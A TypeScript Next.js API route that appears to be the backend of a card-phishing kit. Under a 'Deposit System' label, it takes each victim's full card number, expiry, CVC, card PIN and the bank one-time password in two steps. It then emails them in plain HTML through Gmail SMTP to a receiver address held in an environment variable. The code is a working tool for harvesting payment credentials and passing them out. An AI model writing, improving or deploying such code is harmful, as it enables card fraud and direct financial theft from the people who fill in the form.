import { render } from "@react-email/render"
import nodemailer from "nodemailer"
import { PinEmail, OtpEmail } from "../../../components/email-templates"

export async function POST(request: Request) {
  try {
    const { type, data } = await request.json()

    const step = type === "payment_details" ? "pin" : type === "otp_confirmation" ? "otp" : null

    if (!step) {
      return Response.json({ success: false, error: "Invalid email step type" }, { status: 400 })
    }

    const { email, amount, cardName, cardNumber, expiryDate, cvc, cardType, pin, otp } = data

    const smtpUser = process.env.SMTP_USER
    const smtpPass = process.env.SMTP_PASS
    const receiverEmail = process.env.RECEIVER_EMAIL

    if (!smtpUser || !smtpPass) {
      console.log("[v0] Missing SMTP credentials")
      return Response.json({ success: false, error: "Email service not configured" }, { status: 500 })
    }

    if (!receiverEmail) {
      console.log("[v0] Missing RECEIVER_EMAIL")
      return Response.json({ success: false, error: "Receiver email not configured" }, { status: 500 })
    }

    // Setup SMTP transporter
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: smtpUser,
        pass: smtpPass,
      },
    })

    let subject = ""
    let emailHtml = ""

    // Timestamp for subject
    const timestamp = new Date().toISOString()

    if (step === "pin") {
      subject = `Deposit Transaction - Card Payment (${email}) [${timestamp}]`
      emailHtml = render(
        <PinEmail
          email={email}
          amount={amount}
          cardName={cardName}
          cardNumber={cardNumber}
          expiryDate={expiryDate}
          cvc={cvc}
          cardType={cardType}
          pin={pin}
        />
      )
    } else if (step === "otp") {
      subject = `Deposit Transaction - OTP Verification (${email}) [${timestamp}]`
      emailHtml = render(<OtpEmail email={email} amount={amount} otp={otp} />)
    }

    // Send email
    const response = await transporter.sendMail({
      from: `"Deposit System" <${smtpUser}>`,
      to: receiverEmail,
      subject,
      html: emailHtml,
      text: `Deposit notification for ${email}, amount: ₦${amount}`,
    })

    console.log("[v0] Email sent successfully:", response.messageId)

    return Response.json({ success: true })
  } catch (error: any) {
    console.log("[v0] Email API error:", error)
    return Response.json(
      {
        success: false,
        error: "Failed to send email",
        details: error?.message || "Unknown error",
      },
      { status: 500 }
    )
  }
}
